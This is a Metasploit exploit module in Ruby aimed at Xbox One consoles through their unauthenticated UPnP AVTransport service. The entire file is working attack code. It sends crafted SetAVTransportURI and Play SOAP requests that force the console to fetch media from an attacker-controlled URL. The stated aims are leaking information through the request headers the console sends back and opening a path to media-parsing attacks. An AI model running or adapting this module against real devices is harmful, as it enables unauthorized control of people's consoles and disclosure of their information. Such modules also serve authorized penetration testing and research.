##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

class MetasploitModule < Msf::Exploit::Remote
  Rank = ExcellentRanking

  include Msf::Exploit::Remote::HttpClient

  def initialize(info = {})
    super(update_info(info,
      'Name'           => 'Microsoft Xbox One UPnP AVTransport Remote Media Execution',
      'Description'    => %q{
        This module exploits the unauthenticated UPnP AVTransport service on Microsoft Xbox One 
        consoles. By sending a crafted SetAVTransportURI SOAP request followed by a Play command, 
        an attacker can force the device to retrieve and "play" media from a remote URL. 
        This can be used for Information Disclosure (via HTTP headers) or as a vector for 
        further media-parsing vulnerabilities.
      },
      'Author'         => [ 'Matheus Brito (@despossivel)' ],
      'License'        => MSF_LICENSE,
      'References'     => [
        [ 'URL', 'https://openconnectivity.org/upnp-specs/UPnP-av-AVTransport-v1-Service.pdf' ]
      ],
      'Platform'       => 'win',
      'Targets'        => [ [ 'Xbox One / IIS UPnP Host', {} ] ],
      'DisclosureDate' => '2026-04-24',
      'Notes'          => {
        'Stability'   => [ CRASH_SAFE ],
        'SideEffects' => [ SCREEN_EFFECTS ] # It opens the Media Player app on the Xbox
      }
    ))

    register_options([
      Opt::RPORT(2869),
      OptString.new('TARGETURI', [true, 'The UPnP control endpoint', '/upnphost/udhisapi.dll?control=uuid:db0f5c91-fb57-409b-b6b1-7ee886522e08+urn:upnp-org:serviceId:AVTransport']),
      OptString.new('MEDIA_URL', [true, 'The remote media URL the Xbox should fetch', 'http://192.168.1.62:8080/test.mp4'])
    ])
  end

  def soap_request(action, body)
    send_request_cgi({
      'method'  => 'POST',
      'uri'     => datastore['TARGETURI'],
      'ctype'   => 'text/xml',
      'headers' => {
        'SOAPAction' => "urn:schemas-upnp-org:service:AVTransport:1##{action}"
      },
      'data'    => <<~EOF
        <?xml version="1.0"?>
        <s:Envelope xmlns:s="http://schemas.xmlsoap.org/soap/envelope/">
          <s:Body>
            #{body}
          </s:Body>
        </s:Envelope>
      EOF
    })
  end

  def exploit
    # Phase 1: Set URI
    print_status("Targeting: #{peer}")
    print_status("Setting Media URI to: #{datastore['MEDIA_URL']}")
    
    set_uri_xml = <<~EOF
      <u:SetAVTransportURI xmlns:u="urn:schemas-upnp-org:service:AVTransport:1">
        <InstanceID>0</InstanceID>
        <CurrentURI>#{datastore['MEDIA_URL']}</CurrentURI>
        <CurrentURIMetaData></CurrentURIMetaData>
      </u:SetAVTransportURI>
    EOF

    res = soap_request('SetAVTransportURI', set_uri_xml)

    if res && res.code == 200
      print_good("Successfully set AVTransportURI")
    else
      print_error("Failed to set URI. Target might not be vulnerable or URI is incorrect.")
      return
    end

    # Phase 2: Play
    print_status("Sending Play command...")
    
    play_xml = <<~EOF
      <u:Play xmlns:u="urn:schemas-upnp-org:service:AVTransport:1">
        <InstanceID>0</InstanceID>
        <Speed>1</Speed>
      </u:Play>
    EOF

    res = soap_request('Play', play_xml)

    if res && res.code == 200
      print_good("Play command sent! Check your listener for incoming GET request.")
    else
      print_error("Failed to send Play command.")
    end
  end
end